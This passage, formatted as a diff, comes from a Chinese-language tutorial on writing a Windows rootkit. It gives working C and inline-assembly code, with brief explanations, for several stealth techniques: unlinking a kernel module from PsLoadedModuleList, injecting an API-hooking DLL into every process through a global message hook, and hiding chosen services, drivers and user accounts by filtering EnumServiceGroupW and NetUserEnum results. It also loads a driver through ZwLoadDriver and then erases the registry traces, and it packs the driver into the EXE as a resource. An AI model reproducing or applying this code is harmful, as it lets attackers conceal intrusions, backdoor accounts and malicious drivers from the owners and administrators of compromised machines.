+*((DWORD *)CurrentModuleEntry->ListEntry.Blink)=
+(DWORD)CurrentModuleEntry->ListEntry.Flink;
+CurrentModuleEntry->ListEntry.Flink->Blink=
+CurrentModuleEntry->ListEntry.Blink;
+break;
+}
+}
+//向下移动
+CurrentModuleEntry=(LPMODULE_ENTRY)
+CurrentModuleEntry->ListEntry.Flink;
+}
+return STATUS_SUCCESS;
+}
+从PsLoadedModuleList链上摘除内核模块后，ZwQuerySystemInformation函数就无法枚举出它了。
+
+九、用户态HOOK
+
+用户态的HOOK有很多方法，比如修改函数的前5个字节，修改输入表等，这里采用eyas大哥的方法COPY DLL，主要是这种方法效率不错。HOOK新进程采用消息钩子，所以需要编写成DLL。
+HOOK的步骤首先将需要HOOK的DLL加载到当前进程的地址空间中，然后使用PSAPI中的GetModuleInformation函数获取DLL信息，目的是得到DLL的加载地址。
+BOOL InitHookDll (TCHAR *Name,LPDLLINFO lpHookDllInfo)
+{
+//取得摸快句炳
+if ((lpHookDllInfo->hModule=LoadLibrary(Name))==NULL)
+{
+//错误处理
+}
+//获取摸快信息
+if (!GetModuleInformation(GetCurrentProcess(),lpHookDllInfo->hModule,
+&lpHookDllInfo->ModuleInfo,sizeof(MODULEINFO)))
+{
+//错误处理
+}
+if ((lpHookDllInfo->NewBase=malloc 
+(lpHookDllInfo->ModuleInfo.SizeOfImage))==NULL)
+{
+//错误处理
+}
+//取得摸快地址
+memcpy(lpHookDllInfo->NewBase,lpHookDllInfo->ModuleInfo.lpBaseOfDll,
+lpHookDllInfo->ModuleInfo.SizeOfImage);
+return TRUE;
+}
+DLLINFO是一个自定义结构，保存着模块的句柄、地址等。DLL加载后，模块信息也有了，下面使用GetProcAddress函数取HOOK函数地址，VirtualQuery函数获取虚拟内存信息，VirtualProtect函数改变页面属性，最后修改原函数的地址（GetProcAddress函数的返回值）使其指向我们的代码。
+BOOL HookUserApi (LPDLLINFO lpHookDllInfo,TCHAR *Name,DWORD OldFunc,DWORD *NewFunc)
+{
+//取得需要HOOK函数的地址
+if ((OrigFunc=(DWORD) GetProcAddress (lpHookDllInfo->hModule,Name))==NULL)
+{
+//错误处理
+}
+//获取虚拟内存信息
+if (!VirtualQuery((LPVOID)OrigFunc,&mbi,
+sizeof(MEMORY_BASIC_INFORMATION)))
+{
+//错误处理
+}
+//改变页面属性为读，写，执行
+if (!VirtualProtect(mbi.BaseAddress,mbi.RegionSize,
+PAGE_EXECUTE_READWRITE,&Protect))
+{
+//错误处理
+}
+//HOOK
+JmpCode.mov_eax=(BYTE)0xB8;
+JmpCode.address=(LPVOID)OldFunc;
+JmpCode.jmp_eax=(WORD)0xE0FF;
+//计算原函数地址
+*NewFunc=OrigFunc - (DWORD)lpHookDllInfo->ModuleInfo.lpBaseOfDll 
++ (DWORD)lpHookDllInfo->NewBase;
+//修改原函数地址，指向OldFunc
+memcpy((LPVOID)OrigFunc,(UCHAR *)&JmpCode,sizeof(ASMJUMP));
+return TRUE;
+}
+JmpCode是HOOK结构，保存着我们的函数的地址和JMP的跳转地址。有了上面这2个函数，就可以HOOK任何DLL中的函数了，例如枚举用户使用的是NetUserEnum函数，封装在Netapi32.dll中，HOOK例子如下：
+DWORD WINAPI HookMain (LPVOID lpNot)
+{ 
+if (!(InitHookDll("netapi32.dll",&Netapi32)))
+{
+//错误处理
+}
+if (!(HookUserApi(&Netapi32,"NetUserEnum",(DWORD)HookNetUserEnum,
+&NewNetUserEnum)))
+{
+//错误处理
+}
+......
+}
+HookMain函数需要在DllMain中调用，因为消息钩子加载DLL后，就应该立刻进行API HOOK。Netapi32是DLLINFO结构，保存着Netapi32.dll的信息；HookNetUserEnum是我们的函数，NewNetUserEnum是原函数地址。现在只差消息钩子函数了，安装/卸载消息钩子的函数需要引出，消息钩子的类型是WH_GETMESSAGE，钩子回调函数什么都不做，只是向下传递，因为我们的目的是使新进程加载DLL。
+LRESULT WINAPI Hook (int nCode,WPARAM wParam,LPARAM lParam)
+{
+//向下传递
+return CallNextHookEx(hHook,nCode,wParam,lParam);
+}
+extern "C" __declspec(dllexport) BOOL InstallHook()
+{
+//安装钩子
+if ((hHook=SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)Hook,
+hInst,0))==NULL)
+{
+//错误处理
+}
+return TRUE;
+}
+extern "C" __declspec(dllexport) BOOL UninstallHook()
+{
+//卸载钩子
+return UnhookWindowsHookEx(hHook);
+}
+hInst是在DllMain函数中保存的句柄，这是必须的，否则钩子不会安装成功。用户态的HOOK有很多种方法，用哪个随便你了，只要能HOOK API就行！下面介绍隐藏服务/驱动。
+
+十、隐藏服务/驱动
+
+枚举服务使用的是Advapi32.dll中的5个函数，这5个函数在每个Windows系统中的联系都不一样，所以需要HOOK所有函数。
+EnumServicesStatusA()
+EnumServicesStatusW()
+EnumServicesStatusExA()
+EnumServicesStatusExW()
+EnumServiceGroupW()
+这5个函数中，前4个是公开的，在MSDN中均有叙述，只有最后一个是MS没有公开的，而且只有Unicode版的函数。它的参数和其他4个函数基本一样，返回的结构是LPENUM_SERVICE_STATUS，这个结构也是EnumServicesStatus函数所返回的。5个函数中都有一个dwServiceType参数，表示服务类型，SERVICE_WIN32表示标准Win32服务，SERVICE_DRIVER表示设备驱动。lpServicesReturned为返回服务总数，隐藏的方法还是memcpy移动缓冲区。我们以EnumServiceGroupW函数为例，来看一下代码。
+BOOL WINAPI HookEnumServiceGroupW (SC_HANDLE hSCManager,……)
+{
+......
+__asm
+{
+//参数入栈，注意顺序，要遵循__stdcall调用约定
+push dwUnknown
+push lpResumeHandle
+push lpServicesReturned
+push pcbBytesNeeded
+push cbBufSize
+push lpServices
+push dwServiceState
+push dwServiceType
+push hSCManager
+mov eax,NewEnumServiceGroupW //原函数地址放入EAX
+call eax //请求
+mov sRet,eax //返回值
+}
+if (sRet)
+{
+//处理服务和驱动
+if (dwServiceType==SERVICE_WIN32 || dwServiceType==SERVICE_DRIVER)
+{
+//指向服务列表缓冲区
+lpEnumServiceGroupW=(LPENUM_SERVICE_STATUSW)lpServices;
+for (DWORD n=0; n<*lpServicesReturned; n++)
+{
+......
+if (strnicmp(HIDDEN_SYSTEM_SERVICE,ServiceNameAnsi,
+strlen(ServiceNameAnsi))==0)
+{
+//向前移动服务列表缓冲区
+memcpy((lpEnumServiceGroupW+n),(lpEnumServiceGroupW+n+1),
+((*lpServicesReturned)-n-1) * sizeof (ENUM_SERVICE_STATUSW));
+(*lpServicesReturned)--; //总数要-1
+n--;
+}
+}
+}
+}
+return sRet;
+}
+上边的代码应该很容易理解了，我们隐藏服务/驱动，只需要判断服务名，所以dwServiceType就一块处理了，不必分开。另外请求原函数要遵循__stdcall调用约定，参数从右向左顺序入栈，最后将原函数地址放入EAX中CALL即可。
+
+十一、隐藏用户
+
+枚举用户有3种方法，其一是使用Netapi32.dll中的函数，另一个就是枚举注册表的SAM键了。隐藏注册表前边已经说过了，这里说一下Netapi32.dll导出的3个函数：
+NetUserEnum()
+NetGroupGetUsers()
+NetQueryDisplayInformation()
+第一个函数是枚举用户；第二个函数是获取组内的用户，但根据MSDN的描述，这个函数只适用于域控制器；第三个函数可以枚举用户、组和计算机。NetUserEnum函数支持8种枚举类型，每种类型返回的结构有些不同（其实只是结构成员的名字不同），需要分别处理，另外2个函数也有多种类型，但只有一种是枚举用户的，HOOK这个类型就可以了。3个函数的隐藏方法都是memcpy移动缓冲区，这里以NetUserEnum函数、枚举类型为0进行介绍，其他2个函数和它是一样的，只是结构体不同。
+NET_API_STATUS WINAPI HookNetUserEnum (LPCWSTR servername,……)
+{
+......
+__asm
+{ 
+push resume_handle
+push totalentries
+push entriesread
+push prefmaxlen
+push bufptr
+push filter
+push level
+push servername 
+mov eax,NewNetUserEnum
+call eax
+mov nStatus,eax
+}
+if ((nStatus==NERR_Success) && (bufptr!=NULL))
+{
+if (level==0) //处理枚举类型为0
+{
+//注意bufptr是2级指针
+LPUSER_INFO_0 lpUserInfo=*((LPUSER_INFO_0 *)bufptr);
+if ((nStatus==NERR_Success) || (nStatus==ERROR_MORE_DATA))
+{
+for (DWORD n=0;n<*entriesread;n++)
+{
+......
+if (strnicmp(HIDDEN_SYSTEM_USER,UserNameAnsi,
+strlen(UserNameAnsi))==0)
+{
+//向前移动用户列表缓冲区
+memcpy((lpUserInfo+n),(lpUserInfo+n+1),
+((*entriesread)-n-1) * sizeof (USER_INFO_0));
+(*entriesread)--; //总数--
+n--;
+}
+}
+}
+}
+......
+}
+return nStatus;
+}
+Level表示枚举类型，MSDN中有详细的定义。这3个函数都是Unicode版本，没有ANSI。
+
+十二、驱动的加载与整合
+
+加载驱动一般都是使用Servcie API，但Servcie API创建的服务会在注册表留下痕迹，这不是我们想要的，应该使用一种更好的方法。Native API有2个函数，可以实现驱动的动态加/卸载，不用写注册表，它们是ZwLoadDriver和ZwUnloadDriver函数。使用这2个函数加/卸载驱动，也需要写一下注册表，不过只是配合这2个函数，待驱动加/卸载完成后，就可以删除建立的注册表项，也就是说，我们建立的注册表项最多停留几秒。需要建立的注册表项就是一些服务的键值，比如Type（服务类型），Start（启动类型），ImagePath（驱动路径）等，完整的代码在DevelopmentSetRegistry函数中，就不帖出来了，只帖出动态加/卸载的函数代码。注：动态加/卸载驱动时，已经完成了设置注册表，动态加/卸载驱动后，还要删除注册表项，切记。
+BOOL DevelopmentLaodDriver (WCHAR *DriverName,BOOL LoadBelong)
+{
+...... 
+//加载ntdll.dll
+if ((hModule=LoadLibrary("ntdll.dll"))==NULL)
+{
+//错误处理
+}
+//取得若干函数的地址 
+ZwLoadDriver=(ZwLoadDriverOld) GetProcAddress (hModule,"ZwLoadDriver");
+ZwUnloadDriver=(ZwUnloadDriverOld) GetProcAddress (hModule,"ZwUnloadDriver");
+RtlInitUnicodeString=(RtlInitUnicodeStringOld) GetProcAddress 
+(hModule,"RtlInitUnicodeString");
+RtlNtStatusToDosError=(RtlNtStatusToDosErrorOld) GetProcAddress 
+(hModule,"RtlNtStatusToDosError");
+swprintf(RegDriver,L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s",
+DriverName);
+RtlInitUnicodeString(&ModuleNameWide,RegDriver);
+if (LoadBelong) //TRUE 加载
+{
+//加载驱动
+ntStatus=ZwLoadDriver(&ModuleNameWide);
+......
+}
+if (!LoadBelong) //FALSE卸载
+{
+//卸载驱动
+ntStatus=ZwUnloadDriver(&ModuleNameWide);
+......
+}
+return TRUE;
+}
+我们需要使用一个EXE来操作SYS，这样带着2个文件满处跑肯定不方便，所以有必要将其整合。整合的方法有很多，比如放在EXE结尾、将SYS转化为16进制代码，或者做成资源文件。相比之下，做成资源文件比较简单，也不会给EXE增加太多的体积，运行时一释放就OK了。释放资源需要一系列资源函数，最后使用fwrite将文件写入硬盘。我写了一个ReleaseResource函数，用于实现这个功能。
+BOOL ReleaseResource (TCHAR *DriverPath)
+{
+......
+//查找资源 SYS是资源名 SYSRES是资源类名
+if ((hFind=FindResource(NULL,"SYS","SYSRES"))==NULL)
+{
+//错误处理
+}
+//加载资源
+if ((hLoad=LoadResource(NULL,hFind))==NULL)
+{
+//错误处理
+}
+//取得资源大小
+if ((Size=SizeofResource(NULL,hFind))==0)
+{
+//错误处理
+}
+//取得释放地址
+if ((LockAddr=LockResource(hLoad))==NULL)
+{
+//错误处理
+}
+//打开文件
+if ((fp=fopen(DriverPath,"wb"))==NULL)
+{
+//错误处理
+}
+//写入
+fwrite(LockAddr,1,Size,fp);
+......
+}
+有了这个函数，就可以只带着EXE满世界跑了。
+文章写了这么长，是时候结束了，从上面的讲解中不难看出，我们只要对Windows内核有一点了解，就可以开发一个简单的Rootkit，光盘中包含了本文完整的源代码，如对本文有任何问题，欢迎发邮件给我dahubaobao@eviloctal.com。
+十三、附录下载
+FileInfo(枚举文件目录结构)
+包含隐藏服务/驱动、用户以及用户态HOOK的DLL程序
+包含隐藏进程、文件/目录、端口、注册表和内核模块的SYS以及加载程序
